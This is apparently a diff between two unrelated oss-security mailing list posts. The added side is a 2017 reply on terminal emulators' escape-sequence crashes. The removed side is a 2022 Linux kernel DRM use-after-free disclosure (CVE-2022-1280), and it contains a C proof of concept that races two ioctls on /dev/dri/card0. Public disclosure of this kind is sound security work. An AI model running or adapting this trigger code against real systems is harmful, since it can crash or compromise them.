@@ -1,4 +1,9 @@
-Received: (qmail 29862 invoked by uid 550); 13 Apr 2022 06:51:10 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1800" "Monday" "1" "May" "2017" "19:25:00" "+0200" "Yves-Alexis Perez" "corsac@debian.org" "<1493659500.2460.28.camel@debian.org>" "56" "Re: [oss-security] terminal emulators' processing of escape sequences" "^Date:" nil nil "5" "2017050117:25:00" "[oss-security] terminal emulators' processing of escape sequences" (number mark "        corsac@debia May  1   56/1800  " thread-indent "\"Re: [oss-security] terminal emulators' processing of escape sequences\"\n") "<20170501164428.GA12322@openwall.com>" ("<20170501164428.GA12322@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 19532 invoked by uid 550); 1 May 2017 17:25:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,122 +11,74 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 19511 invoked from network); 1 May 2017 17:25:16 -0000
+Message-ID: <1493659500.2460.28.camel@debian.org>
+In-Reply-To: <20170501164428.GA12322@openwall.com>
+References: <20170501164428.GA12322@openwall.com>
+Content-Type: multipart/signed; micalg="pgp-sha256";
+	protocol="application/pgp-signature"; boundary="=-Y+lXDX6fAwGIeLOCTSju"
+X-Mailer: Evolution 3.22.6-1 
+Mime-Version: 1.0
+Date: Mon, 01 May 2017 19:25:00 +0200
+From: Yves-Alexis Perez <corsac@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 29843 invoked from network); 13 Apr 2022 06:51:09 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=sender:date:from:to:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to;
-        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
-        b=G3S0i4eVVxZFcqC3573fpPg6CjkqQ4++MmfZapcEKRJ/Y/OSuUuPPgbgN/QNdw96ui
-         HXhvsODMI6yqMJkHPjag42MtGosnhtV9B1vvOwjV1ZQ8YSuuYEc/bMVVog3yPg7fp0fm
-         4AmdBeYyghLec4oi/9wM1geEWmxSib9hO4eur7Hf9bINU769sNpsY+M979PNU8YOtAPN
-         oQ9cRLkOfbuJg8qcXS55LNiHkZxW4r71qXOT+dDXNQcWh7lhiJCxLpilNU5Qk/4vIo0x
-         StdnLrcKkXe7+6VwI0WrKrmxjP+dgX7xCaJguGIWWS4IrDm0hTxpdBGpwHDupO1Z+WOj
-         e91g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:sender:date:from:to:subject:message-id
-         :references:mime-version:content-disposition:in-reply-to;
-        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
-        b=5nkxfGroeMX3rJYq3KEedWliTXZJuWPCPZ8qF64bBQI170sMd6WRsskLUyIKM6nnpx
-         kW+IwNrgx7f96xinishVc1tbw38hBh1risBHt9029h2RrlY7wjXkjAN4s3UgD5U4iEmI
-         Dde043I5r+jXOA66Pl/OumxH3L3e/ElSd1p+F51JKgLYSyPiOzrbk4jAFevHd+WPG5PJ
-         mq7saGlicypX3mjBZChyhGNehAqpmlA+y937yaAIxIqmok3MkDImX3UVAzgGtbpDrWKe
-         djE43mM7K3bhGWMoX+l/wB4H7YsFgPouRru/b/hVfkm/myZhir7HQfmE0O3KtqX/fT/C
-         r5Xw==
-X-Gm-Message-State: AOAM530+DKimdk1di6MRo9gFvhJWQQYUZx9haM0gKBriu0tcakrAFr3f
-	JoX99QeSL94NR/Gaqxet5r0VCr58HLUgLw==
-X-Google-Smtp-Source: ABdhPJwLga9kGhtNy2uCtrNmsyqHN1umHcK4/q/T14ZywvAKBvOmcj8zTOraDt5uB8GlLXQjtqqZxA==
-X-Received: by 2002:adf:dc90:0:b0:207:aa5c:8524 with SMTP id r16-20020adfdc90000000b00207aa5c8524mr8607969wrj.523.1649832658478;
-        Tue, 12 Apr 2022 23:50:58 -0700 (PDT)
-Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
-Date: Wed, 13 Apr 2022 08:50:57 +0200
-From: Salvatore Bonaccorso <carnil@debian.org>
+Subject: Re: [oss-security] terminal emulators' processing of escape
+ sequences
 To: oss-security@lists.openwall.com
-Message-ID: <YlZy0dacHoITqtOt@eldamar.lan>
-References: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
-Subject: Re: [oss-security] Linux kernel: A concurrency use-after-free
- between drm_setmaster_ioctl and drm_mode_getresources
 
-Hi,
+--=-Y+lXDX6fAwGIeLOCTSju
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-On Tue, Apr 12, 2022 at 07:42:04PM +0800, Minh Yuan wrote:
-> Hi guys,
-> 
-> We recently discovered a concurrency uaf in drm of the latest kernel
-> version (Linux 4.19.237).
-> 
-> The root cause of this race is that drm_setmaster_ioctl can free an old
-> *fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
-> freed *fpriv->master *in drm_lease_held due to the absence of proper
-> lock/refcounting.
-> 
-> My unstable PoC is shown below (tested on Linux 4.19.237):
-> 
-> #include <endian.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <unistd.h>
-> #include <errno.h>
-> #include <fcntl.h>
-> #include <sys/stat.h>
-> #include <sys/mman.h>
-> #include <pthread.h>
-> #include <sys/xattr.h>
-> #include <sys/shm.h>
-> #include <linux/userfaultfd.h>
-> #include <sys/ioctl.h>
-> #include <drm/drm.h>
-> #include <drm/drm_mode.h>
-> 
-> #define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
-> } while (0)
-> int fd;
-> char a[0x100];
-> void *thread1(void *arg)
-> {
-> 
-> ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
-> 
-> }
-> void *thread2(void *arg)
-> {
-> ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
-> }
-> int main(void)
-> {
-> pthread_t thr1,thr2;
-> 
-> int fd1 = open("/dev/dri/card0",0);
-> fd = open("/dev/dri/card0",0);
-> int fd2 = dup3(fd,fd1,0);
-> int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
-> if(s != 0)
-> errExit("pthread_create");
-> s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
-> if(s != 0)
-> errExit("pthread_create");
-> pthread_join(thr1,NULL);
-> pthread_join(thr2,NULL);
-> close(fd);
-> }
-> 
-> Timeline:
-> * 03.30.22 - Vulnerability reported to security@kernel.org.
-> * 04.01.22 - Vulnerability reported to linux-distros@vs.openwall.org
-> <security@kernel.org>.
-> * 04.12.22 - Vulnerability opened.
+On Mon, 2017-05-01 at 18:44 +0200, Solar Designer wrote:
+> Yves-Alexis Perez of Debian pointed out that whether these crashes occur
+> or not may be related to the version of vte.=C2=A0 I'll leave it up to hi=
+m to
+> post a follow-up on that.
 
-This should have CVE-2022-1280 assigned.
+Indeed, original tests by Solar Designer and Jason A. Donenfeld might have
+targeted xfce4-terminal 0.6 which is written in GTK2 and use vte2 while more
+recent versions (starting 0.8) use GTK3 and vte3.
+
+I tried running the perl script with current Debian sid and:
+
+xfce4-terminal 0.8.4-1
+libvte-2.91-0:amd64 0.46.1-1
+libgtk-3-0:amd64 3.22.12-1
+
+I wasn't able to make the process crash (it seems stuck at some point but t=
+he
+window is somehow resized and I don't have access to the content so it' not
+clear why).
+
+Out of curiosity I also tried lxterminal (0.3.0-1) which is vte2 based, alo=
+ng
+with:
+
+libvte9 1:0.28.2-5+b
+libgtk2.0-0:amd64 2.24.31-2
+
+and I wasn't able to crash the process either. This time the perl process
+terminates successfully.
 
 Regards,
-Salvatore
+--=20
+Yves-Alexis=
+
+--=-Y+lXDX6fAwGIeLOCTSju
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: This is a digitally signed message part
+
+-----BEGIN PGP SIGNATURE-----
+
+iQEzBAABCAAdFiEEl0WwInMjgf6efq/1bdtT8qZ1wKUFAlkHb2wACgkQbdtT8qZ1
+wKUxfggAg89XSONEjTtET9rSWcJEB4A+6Qyiz+smT8i0bYE8f23fK3uUfmIAp4aG
+ZuEFh9I/S+DkVGKBuHUjfe+IzXpRGcB/rYR7q/eaPFf4b/luj+zi/Vc4k124E2vu
+QDMtPewKdO75o6YsZSLeixQyDCDnbcx/3ylThfR9ClEvLpT8gCP1QxsqJAtS3TFI
+HZY5mQbrh3/AzFASQs9rPEUKl7o0pC33Lx3P/cgOTko57wqjrTRJDoKbp/59Rv2/
+q0THPYhQNzcP49MkE3gCzjH6nkR6PDK2hAN5xB3yM24NhgWwM2owWEIiSgTvrLvt
+qzps8Ug7hyPEXUTG8ScMlIgPAHTbww==
+=QO1X
+-----END PGP SIGNATURE-----
+
+--=-Y+lXDX6fAwGIeLOCTSju--
